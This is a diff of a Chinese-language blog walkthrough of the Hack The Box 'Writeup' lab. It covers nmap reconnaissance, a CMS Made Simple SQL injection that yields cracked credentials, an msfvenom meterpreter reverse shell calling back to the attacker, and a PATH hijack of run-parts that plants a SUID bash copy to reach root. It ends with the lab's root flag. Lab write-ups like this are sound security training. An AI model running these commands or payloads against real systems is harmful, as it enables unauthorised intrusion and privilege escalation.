@@ -18,7 +18,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="Writeup is an easy difficulty Linux box with DoS protection in place to prevent brute forcing. A CMS susceptible to a SQL injection vulnerability is found, which is leveraged to gain user credentials.">
 <meta property="og:type" content="article">
@@ -231,44 +231,157 @@
     <div class="post-body" itemprop="articleBody"><p>Writeup is an easy difficulty Linux box with DoS protection in place to prevent brute forcing. A CMS susceptible to a SQL injection vulnerability is found, which is leveraged to gain user credentials. The user is found to be in a non-default group, which has write access to part of the PATH. A path hijacking results in escalation of privileges to root.</p>
 <span id="more"></span>
 
-<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap -sCV -p80,22 10.10.10.138</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-20 23:36 +0800</span><br><span class="line">Nmap scan report for 10.10.10.138 (10.10.10.138)</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)</span><br><span class="line">|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-title: Nothing here yet.</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/writeup/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.52 seconds</span><br></pre></td></tr></table></figure>
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><pre><code>❯ nmap -sCV -p80,22 10.10.10.138
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-20 23:36 +0800
+Nmap scan report for 10.10.10.138 (10.10.10.138)
+Host is up (0.36s latency).
 
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
+| ssh-hostkey:
+|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
+|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-title: Nothing here yet.
+|_http-server-header: Apache/2.4.25 (Debian)
+| http-robots.txt: 1 disallowed entry
+|_/writeup/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.52 seconds
+</code></pre>
 <p>我对靶机的扫描一般都以-sCV起手 这次发现web目录下有robots.txt文件 其他暂无有意思的地方 先访问web服务</p>
 <p><img src="/2025/09/20/Writeup/1.png"></p>
 <p>web服务翻译过来意思为 有Dos防火墙40X访问多了会banip 于是常规的漏扫就先暂缓 先看下robots.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#              __</span><br><span class="line">#      _(\    |@@|</span><br><span class="line">#     (__/\__ \--/ __</span><br><span class="line">#        \___|----|  |   __</span><br><span class="line">#            \ &#125;&#123; /\ )_ / _\</span><br><span class="line">#            /\__/\ \__O (__</span><br><span class="line">#           (--/\--)    \__/</span><br><span class="line">#           _)(  )(_</span><br><span class="line">#          `---&#x27;&#x27;---`</span><br><span class="line"></span><br><span class="line"># Disallow access to the blog until content is finished.</span><br><span class="line">User-agent: * </span><br><span class="line">Disallow: /writeup/</span><br></pre></td></tr></table></figure>
+<pre><code>#              __
+#      _(\    |@@|
+#     (__/\__ \--/ __
+#        \___|----|  |   __
+#            \ &#125;&#123; /\ )_ / _\
+#            /\__/\ \__O (__
+#           (--/\--)    \__/
+#           _)(  )(_
+#          `---&#39;&#39;---`
 
+# Disallow access to the blog until content is finished.
+User-agent: * 
+Disallow: /writeup/
+</code></pre>
 <p>虽然Disallow 但是我就要访问一下 直接访问是写writeup的博客 初步判断以为和hexo一样只是一个单前端 好在源码不多还有特别标注 后来在源码里找到了CMS信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en_US&quot;&gt;&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Home - writeup&lt;/title&gt;</span><br><span class="line">	</span><br><span class="line">&lt;base href=&quot;http://10.10.10.138/writeup/&quot; /&gt;</span><br><span class="line">&lt;meta name=&quot;Generator&quot; content=&quot;CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.&quot; /&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br></pre></td></tr></table></figure>
-
+<pre><code>
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en_US&quot;&gt;&lt;head&gt;
+	&lt;title&gt;Home - writeup&lt;/title&gt;
+	
+&lt;base href=&quot;http://10.10.10.138/writeup/&quot; /&gt;
+&lt;meta name=&quot;Generator&quot; content=&quot;CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.&quot; /&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
+</code></pre>
 <p>然后根据注册信息2004-2019 找到了对应的版本号 应该是2.2.X 最终找到一个概率比较大的<code>CVE-2019-9053</code> 既符合年份 对版本也比较宽容</p>
 <h1 id="Shell-as-jkr"><a href="#Shell-as-jkr" class="headerlink" title="Shell as jkr"></a>Shell as jkr</h1><p>正常来讲用上面的脚本跑一下就行了 上面的脚本是基于时间盲注的 而我的网络环境断断续续 于是得把TIME改为5甚至更高才可以正常注入 当然还不是100%可行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Salt for password found: 5a599ef579066807</span><br><span class="line">[+] Username found: jkr</span><br><span class="line">[+] Email found: jkr@writeup.htb</span><br><span class="line">[+] Password found: 62def4866937f08cc13bab43bb14e6f7</span><br><span class="line">[+] Password cracked: raykayjay9</span><br></pre></td></tr></table></figure>
-
+<pre><code>[+] Salt for password found: 5a599ef579066807
+[+] Username found: jkr
+[+] Email found: jkr@writeup.htb
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+[+] Password cracked: raykayjay9
+</code></pre>
 <p>使用上述账号密码就可以登陆ssh了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">❯ ssh jkr@10.10.10.138</span><br><span class="line">jkr@10.10.10.138&#x27;s password:</span><br><span class="line"></span><br><span class="line">The programs included with the Devuan GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sat Sep 20 05:57:27 2025 from 10.10.*.*</span><br></pre></td></tr></table></figure>
+<pre><code>❯ ssh jkr@10.10.10.138
+jkr@10.10.10.138&#39;s password:
 
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Sep 20 05:57:27 2025 from 10.10.*.*
+</code></pre>
 <h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><h2 id="Failed-Attempt"><a href="#Failed-Attempt" class="headerlink" title="Failed Attempt"></a>Failed Attempt</h2><p>最开始是没有思路的 于是乎上传了linpeas 打算看一下有没有CVE可以利用 当然并不是所有目录都有上传权限 最开始在用户目录并不能成功下载</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ id</span><br><span class="line">uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)</span><br></pre></td></tr></table></figure>
-
+<pre><code>jkr@writeup:~$ id
+uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
+</code></pre>
 <p>id命令永远值得查看 可以看到该用户有被分配<code>staff</code>组别 这个组别比较有意思 可以重点看override那行</p>
 <p><img src="/2025/09/20/Writeup/2.png"></p>
 <p>当然在最开始有查看过SUID的信息 这个待会再说 先说关于SUID和SGID的查找</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># SUID</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"># SGID</span><br><span class="line">find / -perm -g=s -group 50 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
+<pre><code># SUID
+find / -perm -u=s -type f 2&gt;/dev/null
+# SGID
+find / -perm -g=s -group 50 2&gt;/dev/null
+</code></pre>
 <p>区别在于 <code>-perm -u=s -type f</code>的意思是寻找匹配具有SUID权限的文件 而<code>-perm -u=g -group 50</code>意味着寻找具有SGID且组号为50的文件或文件夹</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ find / -perm -g=s -group 50 2&gt;/dev/null</span><br><span class="line">/var/local</span><br><span class="line">/usr/local</span><br><span class="line">/usr/local/bin</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
+<pre><code>jkr@writeup:~$ find / -perm -g=s -group 50 2&gt;/dev/null
+/var/local
+/usr/local
+/usr/local/bin
+...
+</code></pre>
 <p>至少&#x2F;usr&#x2F;local文件夹可以用来下载文件 实现第一步也好 上传了linpeas之后开始扫描 发现了几个有意思的东西</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Executing Linux Exploit Suggester</span><br><span class="line">╚ https://github.com/mzet-/linux-exploit-suggester</span><br><span class="line">[+] [CVE-2022-2586] nft_object UAF</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-4034] PwnKit</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-22555] Netfilter heap out-of-bounds write</span><br><span class="line"></span><br><span class="line">[+] [CVE-2009-1185] udev 2</span><br><span class="line"></span><br><span class="line">╔══════════╣ Checking Pkexec and Polkit</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2</span><br><span class="line"></span><br><span class="line">══╣ Polkit Binary</span><br><span class="line">Pkexec binary found at: /usr/bin/pkexec</span><br><span class="line">Pkexec binary has SUID bit set!</span><br><span class="line">-rwsr-xr-x 1 root root 27448 Mar 18  2019 /usr/bin/pkexec</span><br><span class="line">pkexec version 0.105</span><br></pre></td></tr></table></figure>
+<pre><code>╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester
+[+] [CVE-2022-2586] nft_object UAF
 
+[+] [CVE-2021-4034] PwnKit
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+[+] [CVE-2009-1185] udev 2
+
+╔══════════╣ Checking Pkexec and Polkit
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2
+
+══╣ Polkit Binary
+Pkexec binary found at: /usr/bin/pkexec
+Pkexec binary has SUID bit set!
+-rwsr-xr-x 1 root root 27448 Mar 18  2019 /usr/bin/pkexec
+pkexec version 0.105
+</code></pre>
 <p>之前在扫SUID的时候就发现了Polkit 于是乎试一下用msf连上扫一下好了 这么多选择看看哪个能打</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># 生成反弹shell</span><br><span class="line">❯ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.*.* LPORT=4444 -f elf -o escalate.elf</span><br><span class="line"></span><br><span class="line"># 上传执行</span><br><span class="line">jkr@writeup:/usr/local$ chmod +x escalate.elf</span><br><span class="line">jkr@writeup:/usr/local$ ./escalate.elf</span><br><span class="line"></span><br><span class="line"># shell连接并持久化</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set payload  linux/x86/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 10.10.10.138</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line">[-] Handler failed to bind to 10.10.10.138:4444:-  -</span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br><span class="line">[*] Sending stage (1062760 bytes) to 10.10.10.138</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.*.*:4444 -&gt; 10.10.10.138:33582) at 2025-09-21 21:37:20 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line"></span><br><span class="line"># 扫描可执行CVE</span><br><span class="line">msf exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf post(multi/recon/local_exploit_suggester) &gt; set session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line"></span><br><span class="line">msf post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line">...</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line"> #   Name                                                               Potentially Vulnerable?  Check Result</span><br><span class="line"> -   ----                                                               -----------------------  ------------</span><br><span class="line"> 1   exploit/linux/local/glibc_tunables_priv_esc                        Yes                      The target appears to be vulnerable. The glibc version (2.36-9+deb12u3) found on the target appears to be vulnerable</span><br><span class="line"> 2   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.</span><br><span class="line"> 3   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.</span><br></pre></td></tr></table></figure>
+<pre><code># 生成反弹shell
+❯ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.*.* LPORT=4444 -f elf -o escalate.elf
 
+# 上传执行
+jkr@writeup:/usr/local$ chmod +x escalate.elf
+jkr@writeup:/usr/local$ ./escalate.elf
+
+# shell连接并持久化
+msf &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) &gt; set payload  linux/x86/meterpreter/reverse_tcp
+payload =&gt; linux/x86/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set lhost 10.10.10.138
+msf exploit(multi/handler) &gt; set lport 4444
+msf exploit(multi/handler) &gt; run
+[-] Handler failed to bind to 10.10.10.138:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444
+[*] Sending stage (1062760 bytes) to 10.10.10.138
+[*] Meterpreter session 2 opened (10.10.*.*:4444 -&gt; 10.10.10.138:33582) at 2025-09-21 21:37:20 +0800
+
+meterpreter &gt; background
+[*] Backgrounding session 2...
+
+# 扫描可执行CVE
+msf exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester
+msf post(multi/recon/local_exploit_suggester) &gt; set session 2
+session =&gt; 2
+
+msf post(multi/recon/local_exploit_suggester) &gt; run
+...
+============================
+
+ #   Name                                                               Potentially Vulnerable?  Check Result
+ -   ----                                                               -----------------------  ------------
+ 1   exploit/linux/local/glibc_tunables_priv_esc                        Yes                      The target appears to be vulnerable. The glibc version (2.36-9+deb12u3) found on the target appears to be vulnerable
+ 2   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.
+ 3   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+</code></pre>
 <p>可惜上面一个CVE都不行 可恶啊</p>
 <h2 id="Hijack-run-parts"><a href="#Hijack-run-parts" class="headerlink" title="Hijack run-parts"></a>Hijack run-parts</h2><p>没有办法 还是回到最初的SGID上 这道题没有SUID 但是给出了非常明显的SGID</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ ls -ld /usr/local/bin/ /usr/local/sbin/</span><br><span class="line">drwx-wsr-x 2 root staff 20480 Apr 19 04:11 /usr/local/bin/</span><br><span class="line">drwx-wsr-x 2 root staff 12288 Apr 19 04:11 /usr/local/sbin/</span><br></pre></td></tr></table></figure>
-
+<pre><code>jkr@writeup:~$ ls -ld /usr/local/bin/ /usr/local/sbin/
+drwx-wsr-x 2 root staff 20480 Apr 19 04:11 /usr/local/bin/
+drwx-wsr-x 2 root staff 12288 Apr 19 04:11 /usr/local/sbin/
+</code></pre>
 <p>这两个目录是属于root的 用户组是属于staff的 于是乎同样属于staff用户组的成员有以下权限</p>
 <ul>
 <li>从第二组权限-ws而言 staff用户不可读 可写且可SGID</li>
@@ -276,14 +389,38 @@
 <li>SGID使得内部文件递归自动归位staff组</li>
 </ul>
 <p>理解了上述对staff组的描述 结合<code>/usr/local/bin</code>目录属于root用户 结合jkr用户和该目录属于同一组且有写入权 <strong>如果可以劫持该目录下root用户才会执行命令 就可以执行任何事情了</strong> 接下来我们就需要直到root在该目录下做了什么进而劫持 最终攻击思路从就文件审计转换成了进程监听 我们上传pspy 从ssh登陆开始监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025/09/21 12:02:23 CMD: UID=0     PID=27465  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new</span><br></pre></td></tr></table></figure>
-
+<pre><code>2025/09/21 12:02:23 CMD: UID=0     PID=27465  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new
+</code></pre>
 <p>找到了root用户的<code>run-parts</code>命令 这条命令具体内容不再赘述 关于<code>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code>则是从左往右找到就停止 于是查看最近也是有staff组的<code>/usr/local/bin</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:/usr/local$ cd /usr/local/bin/run-parts</span><br><span class="line">-bash: cd: /usr/local/bin/run-parts: No such file or directory</span><br></pre></td></tr></table></figure>
-
+<pre><code>jkr@writeup:/usr/local$ cd /usr/local/bin/run-parts
+-bash: cd: /usr/local/bin/run-parts: No such file or directory
+</code></pre>
 <p>OK! 那就开始劫持 我们找个root的bash 然后进行SUID啦</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:/usr/local$ ls -al /bin | grep bash</span><br><span class="line">-rwxr-xr-x  1 root root 1099016 May 15  2017 bash</span><br><span class="line">lrwxrwxrwx  1 root root       4 May 15  2017 rbash -&gt; bash</span><br><span class="line"></span><br><span class="line">jkr@writeup:/usr/local$ echo -e &#x27;#!/bin/bash\ncp /bin/bash /bin/pwned\nchmod u+s /bin/pwned&#x27; &gt; /usr/local/bin/run-parts;chmod +x /usr/local/bin/run-parts</span><br><span class="line">jkr@writeup:/usr/local$ cat /usr/local/bin/run-parts</span><br><span class="line">#!/bin/bash</span><br><span class="line">cp /bin/bash /bin/pwned</span><br><span class="line">chmod u+s /bin/pwned</span><br><span class="line"></span><br><span class="line">❯ ssh jkr@10.10.10.138</span><br><span class="line">jkr@10.10.10.138&#x27;s password:</span><br><span class="line">Linux writeup 6.1.0-13-amd64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">The programs included with the Devuan GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Sep 21 08:47:13 2025 from 10.10.*.*</span><br><span class="line">jkr@writeup:~$ pwned -p</span><br><span class="line">pwned-4.4# cat /root/root.txt</span><br><span class="line">d96f12322bd9b380d466009d78591998</span><br></pre></td></tr></table></figure>
+<pre><code>jkr@writeup:/usr/local$ ls -al /bin | grep bash
+-rwxr-xr-x  1 root root 1099016 May 15  2017 bash
+lrwxrwxrwx  1 root root       4 May 15  2017 rbash -&gt; bash
 
+jkr@writeup:/usr/local$ echo -e &#39;#!/bin/bash\ncp /bin/bash /bin/pwned\nchmod u+s /bin/pwned&#39; &gt; /usr/local/bin/run-parts;chmod +x /usr/local/bin/run-parts
+jkr@writeup:/usr/local$ cat /usr/local/bin/run-parts
+#!/bin/bash
+cp /bin/bash /bin/pwned
+chmod u+s /bin/pwned
+
+❯ ssh jkr@10.10.10.138
+jkr@10.10.10.138&#39;s password:
+Linux writeup 6.1.0-13-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Sep 21 08:47:13 2025 from 10.10.*.*
+jkr@writeup:~$ pwned -p
+pwned-4.4# cat /root/root.txt
+d96f12322bd9b380d466009d78591998
+</code></pre>
 <p>一个简单的题 却有很多可以思考的地方 HTB的质量还是很可以的</p>
 
     </div>
